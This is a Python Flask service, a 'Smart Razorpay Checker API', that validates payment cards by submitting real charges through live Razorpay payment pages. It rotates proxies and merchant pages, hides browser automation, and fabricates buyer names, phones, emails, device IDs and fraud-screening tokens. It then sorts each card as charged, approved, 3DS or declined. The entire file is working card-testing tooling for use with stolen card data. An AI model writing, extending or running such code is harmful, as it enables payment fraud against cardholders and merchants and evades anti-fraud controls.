# =============================================================================
# main.py — Smart Razorpay Checker API
# =============================================================================
# Endpoints:
#   GET /rz?cc=CC|MM|YYYY|CVV[&proxy=ip:port:user:pass][&site=URL]
#   GET /pool             list sites
#   GET /pool/add?url=... add site
#   GET /proxy            list proxies
#   GET /proxy/add?url=.. add proxy
#   GET /stats            full health
#   GET /health           quick status
# =============================================================================

import os
import re
import json
import time
import random
import string
import asyncio
import hashlib
import secrets
import logging
import threading
from base64 import b64encode
from urllib.parse import quote, unquote

from flask import Flask, request, jsonify
from playwright.async_api import async_playwright, TimeoutError as PWTimeoutError

PORT            = int(os.getenv("PORT") or os.getenv("RZ_PORT") or 8080)
POOL_FILE       = os.getenv("RZ_POOL_FILE", "rz_pool.txt")
PROXY_FILE      = os.getenv("RZ_PROXY_FILE", "px.txt")
DEAD_SITES      = os.getenv("RZ_DEAD_FILE", "rz_dead.txt")
BUILD_DEFAULT   = os.getenv("RZ_BUILD", "afa3662e035e66c495f2ddc21c6f030530870f53")
BUILD_V1_DEFAULT= os.getenv("RZ_BUILD_V1", "da4ee3f43a28ad81dba8ed06daf899a4520c691f")
CHECK_TIMEOUT   = int(os.getenv("RZ_TIMEOUT", "150"))
MAX_RETRIES     = int(os.getenv("RZ_RETRIES", "3"))
HEALTH_INTERVAL = int(os.getenv("RZ_HEALTH_TTL", "900"))
SITE_FAIL_LIMIT = int(os.getenv("RZ_SITE_FAILS", "3"))
PROXY_FAIL_LIMIT= int(os.getenv("RZ_PROXY_FAILS", "2"))

logging.basicConfig(level=logging.INFO,
                    format="[%(asctime)s] [%(levelname)s] %(message)s",
                    datefmt="%H:%M:%S")
log = logging.getLogger("rzp")

app = Flask(__name__)
app.config["JSON_SORT_KEYS"] = False

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")

LAUNCH_ARGS = [
    "--no-sandbox",
    "--disable-dev-shm-usage",
    "--disable-gpu",
    "--disable-blink-features=AutomationControlled",
    "--disable-features=IsolateOrigins,site-per-process",
    "--no-first-run",
    "--no-default-browser-check",
]

BASE62 = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"

DEFAULT_SITES = [
    "https://pages.razorpay.com/all-live-1",
    "https://pages.razorpay.com/all-live-2",
    "https://pages.razorpay.com/all-live-3",
    "https://pages.razorpay.com/all-live-5",
    "https://pages.razorpay.com/boxelements",
    "https://pages.razorpay.com/ezquant-halfyearly-new",
    "https://pages.razorpay.com/ezquant-weekly-new",
    "https://pages.razorpay.com/build-capacity",
    "https://pages.razorpay.com/bharatsastra",
    "https://pages.razorpay.com/mann",
]

# ─────────────────────────────────────────────────────────────────────────────
# RESPONSE
# ─────────────────────────────────────────────────────────────────────────────

def R(status, response, proxy_status="Live"):
    return {"proxy": proxy_status, "response": response, "status": status}

CHARGED_KW = ["transaction_success", "payment_successful", "payment successful",
              "order_paid", "razorpay_signature", "captured"]

APPROVED_KW = ["insufficient", "insufficient_funds", "insufficient account balance",
               "account balance", "cvv", "incorrect_cvv", "cvc", "ccn",
               "maximum transaction limit", "transaction limit"]

DECLINED_KW = ["cancelled", "canceled", "payment_cancelled", "declined",
               "do_not_honor", "do not honor", "card_declined", "card declined",
               "expired_card", "expired card", "stolen_card", "stolen card",
               "lost_card", "lost card", "pickup_card", "pickup card",
               "restricted_card", "restricted card", "fraudulent", "fraud suspected",
               "transaction_not_allowed", "transaction not allowed",
               "card_not_supported", "card not supported", "not_permitted",
               "generic_decline", "generic decline", "authentication_failed",
               "processor_declined", "payment_failed", "payment failed"]

THREEDS_KW = ["otp", "3ds", "3d_secure", "3d secure", "challenge",
              "authentication_required", "requires_action", "authentication pending"]

def classify(desc, reason):
    text = f"{desc} {reason}".lower()
    if any(k in text for k in CHARGED_KW): return "charged"
    if any(k in text for k in THREEDS_KW): return "3ds"
    if any(k in text for k in APPROVED_KW): return "approved"
    if any(k in text for k in DECLINED_KW): return "declined"
    return "declined"

def fmt_err(desc, reason):
    desc = (desc or "").strip()
    reason = (reason or "").strip()
    if reason and desc: return f"{desc} ({reason})"
    return desc or reason or "Unknown Decline"

# ─────────────────────────────────────────────────────────────────────────────
# PROXY
# ─────────────────────────────────────────────────────────────────────────────

def format_proxy(raw):
    if not raw: return ""
    raw = raw.strip()
    if "://" in raw: return raw
    parts = raw.split(":")
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f"http://{user}:{pwd}@{ip}:{port}"
    if len(parts) == 2:
        return f"http://{raw}"
    return "http://" + raw

def parse_proxy(proxy_str):
    if not proxy_str: return None
    proxy_str = proxy_str.strip()
    scheme = "http"
    if "://" in proxy_str:
        s = proxy_str.split("://", 1)
        if s[0].lower() in ("http", "https", "socks4", "socks5"):
            scheme = s[0].lower()
            proxy_str = s[1]
    user = pwd = ""
    if "@" in proxy_str:
        auth, host = proxy_str.rsplit("@", 1)
        user, _, pwd = auth.partition(":")
    elif proxy_str.count(":") == 3:
        ip, port, user, pwd = proxy_str.split(":")
        host = f"{ip}:{port}"
    elif proxy_str.count(":") == 1:
        host = proxy_str
    else:
        return None
    cfg = {"server": f"{scheme}://{host}"}
    if user:
        cfg["username"] = user
        cfg["password"] = pwd
    return cfg

class ProxyPool:
    def __init__(self):
        self._lock = threading.Lock()
        self._proxies = {}
    def load(self, path):
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                for ln in f:
                    ln = ln.strip()
                    if not ln or ln.startswith("#"): continue
                    p = format_proxy(ln)
                    if p:
                        with self._lock:
                            self._proxies.setdefault(p, {"alive": True, "fails": 0,
                                                          "last_used": 0, "last_check": 0})
        except FileNotFoundError: pass
        log.info("proxy pool: %d", len(self._proxies))
    def add(self, url):
        url = format_proxy(url)
        if not url: return False
        with self._lock:
            if url in self._proxies: return False
            self._proxies[url] = {"alive": True, "fails": 0, "last_used": 0, "last_check": 0}
        return True
    def next(self, exclude=None):
        exclude = exclude or set()
        with self._lock:
            live = [u for u, p in self._proxies.items() if p["alive"] and u not in exclude]
            if not live:
                for u in self._proxies:
                    if u not in exclude:
                        self._proxies[u]["alive"] = True
                        self._proxies[u]["fails"] = 0
                live = [u for u, p in self._proxies.items() if p["alive"] and u not in exclude]
            if not live: return None
            live.sort(key=lambda u: self._proxies[u]["last_used"])
            pick = live[0]
            self._proxies[pick]["last_used"] = time.time()
            return pick
    def report(self, url, ok):
        if not url: return
        with self._lock:
            if url not in self._proxies:
                self._proxies[url] = {"alive": True, "fails": 0, "last_used": time.time(), "last_check": time.time()}
            p = self._proxies[url]
            p["last_check"] = time.time()
            if ok:
                p["fails"] = 0; p["alive"] = True
            else:
                p["fails"] += 1
                if p["fails"] >= PROXY_FAIL_LIMIT: p["alive"] = False
    def stats(self):
        with self._lock:
            total = len(self._proxies)
            alive = sum(1 for p in self._proxies.values() if p["alive"])
            return {"total": total, "alive": alive, "dead": total - alive}
    def all(self):
        with self._lock: return {u: dict(p) for u, p in self._proxies.items()}

proxy_pool = ProxyPool()

# ─────────────────────────────────────────────────────────────────────────────
# SITES
# ─────────────────────────────────────────────────────────────────────────────

class SitePool:
    def __init__(self):
        self._lock = threading.Lock()
        self._sites = {}
    def load(self):
        for u in DEFAULT_SITES:
            with self._lock:
                self._sites.setdefault(u, {"alive": True, "fails": 0, "last_used": 0, "last_check": 0})
        try:
            with open(POOL_FILE, "r", encoding="utf-8", errors="ignore") as f:
                for ln in f:
                    ln = ln.strip()
                    if not ln or ln.startswith("#"): continue
                    with self._lock:
                        self._sites.setdefault(ln, {"alive": True, "fails": 0, "last_used": 0, "last_check": 0})
        except FileNotFoundError: pass
        log.info("site pool: %d", len(self._sites))
    def add(self, url):
        if not url: return False
        if not url.startswith("http"): url = "https://" + url
        with self._lock:
            if url in self._sites: return False
            self._sites[url] = {"alive": True, "fails": 0, "last_used": 0, "last_check": 0}
        try:
            with open(POOL_FILE, "a", encoding="utf-8") as f: f.write(url + "\n")
        except Exception: pass
        return True
    def next(self, exclude=None, explicit=None):
        if explicit: return explicit
        exclude = exclude or set()
        with self._lock:
            live = [u for u, s in self._sites.items() if s["alive"] and u not in exclude]
            if not live:
                for u in self._sites:
                    if u not in exclude:
                        self._sites[u]["alive"] = True
                        self._sites[u]["fails"] = 0
                live = [u for u, s in self._sites.items() if s["alive"] and u not in exclude]
            if not live: return None
            live.sort(key=lambda u: self._sites[u]["last_used"])
            pick = live[0]
            self._sites[pick]["last_used"] = time.time()
            return pick
    def report(self, url, ok):
        if not url: return
        with self._lock:
            if url not in self._sites:
                self._sites[url] = {"alive": True, "fails": 0, "last_used": time.time(), "last_check": time.time()}
            s = self._sites[url]
            s["last_check"] = time.time()
            if ok:
                s["fails"] = 0; s["alive"] = True
            else:
                s["fails"] += 1
                if s["fails"] >= SITE_FAIL_LIMIT:
                    s["alive"] = False
                    try:
                        with open(DEAD_SITES, "a", encoding="utf-8") as f:
                            f.write(f"{url}\t{time.strftime('%Y-%m-%d %H:%M')}\n")
                    except Exception: pass
    def stats(self):
        with self._lock:
            total = len(self._sites)
            alive = sum(1 for s in self._sites.values() if s["alive"])
            return {"total": total, "alive": alive, "dead": total - alive}
    def all(self):
        with self._lock: return {u: dict(s) for u, s in self._sites.items()}

site_pool = SitePool()

# ─────────────────────────────────────────────────────────────────────────────
# BROWSER
# ─────────────────────────────────────────────────────────────────────────────

class BrowserPool:
    _pw = None
    _browser = None
    _lock = None

    @classmethod
    async def get(cls):
        if cls._lock is None:
            cls._lock = asyncio.Lock()
        async with cls._lock:
            if cls._browser is None or not cls._browser.is_connected():
                if cls._browser:
                    try: await cls._browser.close()
                    except Exception: pass
                if cls._pw is None:
                    cls._pw = await async_playwright().start()
                cls._browser = await cls._pw.chromium.launch(headless=True, args=LAUNCH_ARGS)
                log.info("browser launched")
            return cls._browser

# ─────────────────────────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────────────────────────

FIRST = ["Aarav", "Vivaan", "Aditya", "Vihaan", "Arjun", "Sai", "Ishaan", "Rohan", "Karan", "Rahul"]
LAST  = ["Sharma", "Patel", "Singh", "Verma", "Gupta", "Reddy", "Kumar", "Joshi", "Mehta", "Nair"]

def rand_phone():
    return "+91" + random.choice("6789") + "".join(str(random.randint(0, 9)) for _ in range(9))

def rand_name():
    return f"{random.choice(FIRST)} {random.choice(LAST)}"

def rand_email(name):
    return name.lower().replace(" ", ".") + str(random.randint(1, 99)) + "@gmail.com"

def build_device_id():
    h = hashlib.sha1(secrets.token_bytes(16)).hexdigest()
    ts = str(int(time.time() * 1000))
    rnd = str(random.randrange(10 ** 8)).zfill(8)
    return f"1.{h}.{ts}.{rnd}"

def build_token_create(checkout_id):
    payload = [
        {"name": "sardine", "metadata": {"session_id": checkout_id}},
        {"name": "stripe_radar", "metadata": {"session_id": "rse_" + "".join(
            secrets.choice(string.ascii_letters + string.digits) for _ in range(22))}},
    ]
    return b64encode(json.dumps(payload, separators=(",", ":")).encode()).decode()

def parse_cc(cc):
    parts = cc.split("|")
    if len(parts) != 4: return None
    num, mm, yy, cvv = (p.strip() for p in parts)
    if not (num.isdigit() and mm.isdigit() and yy.isdigit() and cvv.isdigit()): return None
    if not (13 <= len(num) <= 19): return None
    if not (1 <= int(mm) <= 12): return None
    return {"number": num, "month": mm.zfill(2),
            "year": yy[-2:] if len(yy) == 4 else yy, "cvv": cvv}

# ─────────────────────────────────────────────────────────────────────────────
# CORE CHECK
# ─────────────────────────────────────────────────────────────────────────────

async def run_check_async(site_url, cc_str, proxy_url):
    card = parse_cc(cc_str)
    if not card:
        return R("error", "Invalid card format. Use cc|mm|yy|cvv", "Live")

    proxy_cfg = parse_proxy(proxy_url)
    if not proxy_cfg:
        return R("error", "Invalid proxy format", "Dead")

    name = rand_name()
    phone = rand_phone()
    email = rand_email(name)
    device_id = build_device_id()
    unified_id = "".join(secrets.choice(BASE62) for _ in range(14))

    try:
        browser = await BrowserPool.get()
    except Exception as e:
        return R("error", f"browser unavailable: {str(e)[:120]}", "Live")

    ctx = None
    try:
        ctx = await browser.new_context(
            user_agent=UA,
            viewport={"width": 1366, "height": 768},
            locale="en-IN",
            timezone_id="Asia/Kolkata",
            proxy=proxy_cfg,
        )
        await ctx.add_init_script("Object.defineProperty(navigator,'webdriver',{get:()=>undefined});")
        page = await ctx.new_page()
        page.set_default_timeout(40000)

        try:
            await page.goto(site_url, wait_until="domcontentloaded", timeout=35000)
        except Exception as e:
            msg = str(e).lower()
            dead = any(k in msg for k in ("proxy", "net::", "err_", "tunnel", "refused", "resolve"))
            return R("error", f"site load failed: {str(e)[:100]}", "Dead" if dead else "Live")

        merchant = await page.evaluate("""() => {
            const out = {};
            const scan = (obj) => {
                if (!obj || typeof obj !== 'object') return;
                if (obj.keyless_header) out.keyless_header = obj.keyless_header;
                if (obj.key_id) out.key_id = obj.key_id;
                if (obj.payment_link) {
                    out.payment_link_id = obj.payment_link.id;
                    const items = obj.payment_link.payment_page_items || [];
                    if (items[0]) out.payment_page_item_id = items[0].id;
                    const amt = items[0]?.item?.amount || obj.payment_link.min_amount_value;
                    if (amt) out.amount = parseInt(amt, 10);
                }
            };
            scan(window.data);
            scan(window.__INITIAL_STATE__);
            scan(window.__CHECKOUT_DATA__);
            if (!out.keyless_header) {
                for (const s of document.querySelectorAll('script')) {
                    const t = s.textContent || '';
                    let m = t.match(/keyless_header["']?\\s*[:=]\\s*["']([^"']+)/);
                    if (m) out.keyless_header = m[1];
                    m = t.match(/key_id["']?\\s*[:=]\\s*["']([^"']+)/);
                    if (m) out.key_id = m[1];
                    m = t.match(/payment_link_id["']?\\s*[:=]\\s*["']([^"']+)/);
                    if (m) out.payment_link_id = m[1];
                    m = t.match(/payment_page_item_id["']?\\s*[:=]\\s*["']([^"']+)/);
                    if (m) out.payment_page_item_id = m[1];
                }
            }
            return out;
        }""")

        needed = ("keyless_header", "key_id", "payment_link_id", "payment_page_item_id")
        missing = [k for k in needed if not merchant.get(k)]
        if missing:
            return R("error", f"merchant data missing: {', '.join(missing)}", "Live")

        keyless_header = merchant["keyless_header"]
        key_id = merchant["key_id"]
        payment_link_id = merchant["payment_link_id"]
        payment_page_item_id = merchant["payment_page_item_id"]
        amount = int(merchant.get("amount") or 100)
        if amount < 100: amount = 100

        params = {
            "traffic_env": "production",
            "build": BUILD_DEFAULT,
            "build_v1": BUILD_V1_DEFAULT,
            "checkout_v2": "1",
            "new_session": "1",
            "keyless_header": keyless_header,
            "rzp_device_id": device_id,
            "unified_session_id": unified_id,
        }
        qs = "&".join(f"{k}={quote(str(v), safe='')}" for k, v in params.items())
        try:
            await page.goto(f"https://api.razorpay.com/v1/checkout/public?{qs}",
                            wait_until="domcontentloaded", timeout=35000)
        except Exception as e:
            return R("error", f"checkout load failed: {str(e)[:100]}", "Live")

        session_token = await page.evaluate("""() => {
            if (window.session_token) return window.session_token;
            const html = document.documentElement.innerHTML;
            const m = html.match(/session_token["']?\\s*[:=]\\s*["']([A-F0-9]{40,})["']/);
            return m ? m[1] : null;
        }""")
        if not session_token:
            return R("error", "session_token not found", "Live")

        order_id = await page.evaluate("""async ([pl, ppi, amt]) => {
            try {
                const r = await fetch(`https://api.razorpay.com/v1/payment_pages/${pl}/order`, {
                    method: 'POST',
                    headers: {'Accept':'application/json','Content-Type':'application/json'},
                    body: JSON.stringify({
                        notes: {comment: '', name: 'User'},
                        line_items: [{payment_page_item_id: ppi, amount: amt}]
                    })
                });
                const d = await r.json();
                if (d.order) return d.order.id;
                if (d.error) return 'ERR:' + JSON.stringify(d.error);
                return null;
            } catch (e) { return 'ERR:' + e.message; }
        }""", [payment_link_id, payment_page_item_id, amount])

        if not order_id or str(order_id).startswith("ERR:"):
            return R("error", f"order failed: {str(order_id)[:80]}", "Live")

        checkout_id = order_id.split("_", 1)[1] if "_" in order_id else order_id
        token_create = build_token_create(checkout_id)

        payload = {
            "notes[comment]": "",
            "notes[email]": email,
            "notes[phone]": phone[3:],
            "notes[name]": name,
            "payment_link_id": payment_link_id,
            "key_id": key_id,
            "callback_url": "https://your-server.com/callback",
            "contact": phone,
            "email": email,
            "currency": "INR",
            "user_risk_providers_token": token_create,
            "_[integration]": "payment_pages",
            "_[checkout_id]": checkout_id,
            "_[device.id]": device_id,
            "_[library]": "checkoutjs",
            "_[library_src]": "no-src",
            "_[current_script_src]": "no-src",
            "_[platform]": "browser",
            "_[env]": "",
            "_[is_magic_script]": "false",
            "_[os]": "windows",
            "_[referer]": site_url,
            "_[shield][fhash]": hashlib.sha1(secrets.token_bytes(16)).hexdigest(),
            "_[shield][tz]": "330",
            "_[shield][os]": "windows",
            "_[shield][platform]": "browser",
            "_[shield][browser]": "chrome",
            "_[device_id]": device_id,
            "_[build]": BUILD_DEFAULT,
            "_[request_index]": "1",
            "amount": str(amount),
            "order_id": order_id,
            "method": "card",
            "card[number]": card["number"],
            "card[cvv]": card["cvv"],
            "card[name]": name,
            "card[expiry_month]": card["month"],
            "card[expiry_year]": card["year"],
            "save": "0",
        }

        result = await page.evaluate("""async ([payload, k, st, kh]) => {
            const qs = new URLSearchParams({key_id: k, session_token: st, keyless_header: kh});
            const body = new URLSearchParams();
            for (const [key, val] of Object.entries(payload)) body.append(key, val);
            try {
                const url = `https://api.razorpay.com/v1/standard_checkout/payments/create/ajax?${qs.toString()}`;
                const r = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'x-session-token': st,
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Origin': 'https://api.razorpay.com',
                        'Referer': `https://api.razorpay.com/v1/checkout/public?session_token=${st}`
                    },
                    body: body.toString()
                });
                const text = await r.text();
                let parsed;
                try { parsed = JSON.parse(text); } catch { parsed = text; }
                return {status: r.status, raw: text.slice(0, 800), body: parsed};
            } catch (e) {
                return {status: 0, raw: '', body: 'NETWORK:' + e.message};
            }
        }""", [payload, key_id, session_token, keyless_header])

        body = result.get("body") if isinstance(result, dict) else result
        status_code = result.get("status", 0) if isinstance(result, dict) else 0

        payment_id = None
        if isinstance(body, dict):
            payment_id = (body.get("payment_id")
                          or body.get("razorpay_payment_id")
                          or (body.get("payment") or {}).get("id"))

            if body.get("redirect") is True or body.get("type") == "redirect":
                redirect_url = ""
                if isinstance(body.get("request"), dict):
                    redirect_url = body["request"].get("url", "")

                if redirect_url:
                    try:
                        await page.goto(redirect_url, wait_until="domcontentloaded", timeout=40000)
                        html = await page.content()
                        if "razorpay_signature" in html:
                            return R("charged", "Payment Successful", "Live")

                        status = await page.evaluate("""async ([pid, k, st, kh]) => {
                            const qs = new URLSearchParams({key_id: k, session_token: st, keyless_header: kh});
                            try {
                                const r = await fetch(`https://api.razorpay.com/v1/standard_checkout/payments/${pid}?${qs}`,
                                    {headers: {'x-session-token': st}});
                                const d = await r.json();
                                return d.status || 'unknown';
                            } catch { return 'unknown'; }
                        }""", [payment_id, key_id, session_token, keyless_header])

                        if status in ("captured", "authorized"):
                            return R("charged", f"payment_id: {payment_id} | status: {status}", "Live")
                        if status == "pending":
                            return R("3ds", f"payment_id: {payment_id} | OTP Required", "Live")
                        return R("3ds", f"payment_id: {payment_id} | 3DS challenge", "Live")
                    except Exception as e:
                        return R("3ds", f"3ds redirect error: {str(e)[:100]}", "Live")

                return R("3ds", "3ds redirect without url", "Live")

            if "razorpay_signature" in body or "signature" in body:
                return R("charged", "Payment Successful", "Live")

            if "error" in body:
                err = body["error"]
                desc = err.get("description") or err.get("reason") or str(err)
                reason = err.get("reason") or ""
                return R(classify(desc, reason), fmt_err(desc, reason), "Live")

            if body.get("status") in ("captured", "authorized"):
                return R("charged", f"payment_id: {payment_id or 'n/a'} | status: {body['status']}", "Live")

            return R("error", f"[HTTP {status_code}] {json.dumps(body)[:180]}", "Live")

        return R("error", f"[HTTP {status_code}] {str(body)[:180]}", "Live")

    except PWTimeoutError as e:
        return R("error", f"timeout: {str(e)[:100]}", "Live")
    except Exception as e:
        return R("error", f"error: {str(e)[:120]}", "Live")
    finally:
        try:
            if ctx: await ctx.close()
        except Exception: pass

# ─────────────────────────────────────────────────────────────────────────────
# BACKGROUND LOOP
# ─────────────────────────────────────────────────────────────────────────────

_bg_loop = asyncio.new_event_loop()
def _start_bg():
    asyncio.set_event_loop(_bg_loop)
    _bg_loop.run_forever()
threading.Thread(target=_start_bg, daemon=True).start()

def run_on_bg(coro, timeout=CHECK_TIMEOUT + 30):
    fut = asyncio.run_coroutine_threadsafe(coro, _bg_loop)
    return fut.result(timeout=timeout)

# ─────────────────────────────────────────────────────────────────────────────
# HEALTH LOOP
# ─────────────────────────────────────────────────────────────────────────────

async def _check_site_alive(site_url):
    try:
        browser = await BrowserPool.get()
        ctx = await browser.new_context(user_agent=UA)
        page = await ctx.new_page()
        page.set_default_timeout(20000)
        try:
            await page.goto(site_url, wait_until="domcontentloaded", timeout=18000)
            content = await page.content()
            return ("keyless_header" in content and "payment_link" in content)
        except Exception:
            return False
        finally:
            try: await ctx.close()
            except Exception: pass
    except Exception:
        return False

async def _health_loop():
    while True:
        await asyncio.sleep(HEALTH_INTERVAL)
        try:
            for url, info in site_pool.all().items():
                if time.time() - info.get("last_check", 0) < HEALTH_INTERVAL:
                    continue
                ok = await _check_site_alive(url)
                site_pool.report(url, ok)
                if not ok: log.warning("site dead: %s", url)
        except Exception as e:
            log.warning("health loop: %s", e)

def _start_health():
    def _run():
        asyncio.set_event_loop(_bg_loop)
        _bg_loop.create_task(_health_loop())
    _bg_loop.call_soon_threadsafe(_run)

# ─────────────────────────────────────────────────────────────────────────────
# SMART CHECK
# ─────────────────────────────────────────────────────────────────────────────

def smart_check(cc_str, explicit_proxy=None, explicit_site=None):
    tried_sites = set()
    tried_proxies = set()
    last = None

    for attempt in range(MAX_RETRIES):
        proxy_url = explicit_proxy or proxy_pool.next(exclude=tried_proxies)
        if not proxy_url:
            return R("error", "no proxies available", "Dead")
        tried_proxies.add(proxy_url)

        site_url = site_pool.next(exclude=tried_sites, explicit=explicit_site)
        if not site_url:
            return R("error", "no sites available", "Live")
        tried_sites.add(site_url)

        log.info("attempt %d/%d — site=%s proxy=%s",
                 attempt + 1, MAX_RETRIES,
                 site_url.replace("https://pages.razorpay.com/", "")[:30],
                 proxy_url.split("@")[-1] if "@" in proxy_url else proxy_url[:30])

        try:
            result = run_on_bg(run_check_async(site_url, cc_str, proxy_url))
        except Exception as e:
            result = R("error", f"exception: {str(e)[:100]}", "Live")

        status = result.get("status")
        proxy_status = result.get("proxy", "Live")

        proxy_pool.report(proxy_url, ok=(proxy_status != "Dead"))

        if status == "error":
            resp_low = result.get("response", "").lower()
            if any(k in resp_low for k in ("merchant data missing", "session_token not found",
                                            "order failed", "site load failed")):
                site_pool.report(site_url, ok=False)
            else:
                site_pool.report(site_url, ok=True)
            last = result
            continue

        site_pool.report(site_url, ok=True)
        return result

    return last or R("error", "all attempts failed", "Live")

# ─────────────────────────────────────────────────────────────────────────────
# ROUTES
# ─────────────────────────────────────────────────────────────────────────────

@app.route("/rz", methods=["GET"])
@app.route("/razorpay", methods=["GET"])
def rz_route():
    cc_raw = (request.args.get("cc") or "").strip()
    proxy_raw = (request.args.get("proxy") or "").strip()
    site_raw = (request.args.get("site") or "").strip()

    if not cc_raw:
        return jsonify(R("error", "Missing cc parameter", "Live")), 400

    cc = unquote(cc_raw)
    if not parse_cc(cc):
        return jsonify(R("error", "Invalid card format. Use cc|mm|yy|cvv", "Live")), 400

    explicit_proxy = format_proxy(unquote(proxy_raw)) if proxy_raw else None
    explicit_site = site_raw or None

    t0 = time.time()
    try:
        result = smart_check(cc, explicit_proxy, explicit_site)
    except Exception as e:
        log.exception("smart_check crashed")
        result = R("error", f"internal: {str(e)[:120]}", "Live")

    elapsed = round(time.time() - t0, 2)
    log.info("[%s] %s | %s | %.2fs",
             result.get("status", "?").upper(),
             cc.split("|")[0][:6] + "******" + cc.split("|")[0][-4:],
             result.get("response", "")[:70], elapsed)

    code = 500 if result.get("status") == "error" else 200
    return jsonify(result), code

@app.route("/pool", methods=["GET"])
def pool_route():
    return jsonify({"stats": site_pool.stats(), "sites": site_pool.all()})

@app.route("/pool/add", methods=["GET", "POST"])
def pool_add_route():
    url = (request.args.get("url") or "").strip()
    if not url:
        try:
            body = request.get_json(silent=True) or {}
            url = (body.get("url") or "").strip()
        except Exception: pass
    if not url:
        return jsonify({"status": "error", "response": "missing url"}), 400
    return jsonify({"status": "ok", "added": site_pool.add(url), "url": url})

@app.route("/proxy", methods=["GET"])
def proxy_route():
    return jsonify({"stats": proxy_pool.stats(), "proxies": proxy_pool.all()})

@app.route("/proxy/add", methods=["GET", "POST"])
def proxy_add_route():
    url = (request.args.get("url") or "").strip()
    if not url:
        try:
            body = request.get_json(silent=True) or {}
            url = (body.get("url") or "").strip()
        except Exception: pass
    if not url:
        return jsonify({"status": "error", "response": "missing url"}), 400
    return jsonify({"status": "ok", "added": proxy_pool.add(url), "url": url})

@app.route("/stats", methods=["GET"])
def stats_route():
    return jsonify({
        "sites": site_pool.stats(),
        "proxies": proxy_pool.stats(),
        "uptime": int(time.time() - _START_TIME),
    })

@app.route("/health", methods=["GET"])
@app.route("/", methods=["GET"])
def health_route():
    return jsonify({
        "status": "ok",
        "build": BUILD_DEFAULT,
        "sites": site_pool.stats(),
        "proxies": proxy_pool.stats(),
        "uptime": int(time.time() - _START_TIME),
    })

# ─────────────────────────────────────────────────────────────────────────────
# BOOT
# ─────────────────────────────────────────────────────────────────────────────

_START_TIME = time.time()

def _boot():
    log.info("=" * 60)
    log.info("  RAZORPAY API")
    log.info("  Port: %d | Retries: %d | Health: %ds",
             PORT, MAX_RETRIES, HEALTH_INTERVAL)
    log.info("=" * 60)
    site_pool.load()
    proxy_pool.load(PROXY_FILE)
    log.info("sites: %d | proxies: %d",
             site_pool.stats()["total"], proxy_pool.stats()["total"])
    try:
        run_on_bg(BrowserPool.get(), timeout=30)
        log.info("browser warmed up")
    except Exception as e:
        log.warning("warmup failed: %s", e)
    _start_health()

if __name__ == "__main__":
    _boot()
    app.run(host="0.0.0.0", port=PORT, threaded=True,
            debug=False, use_reloader=False)
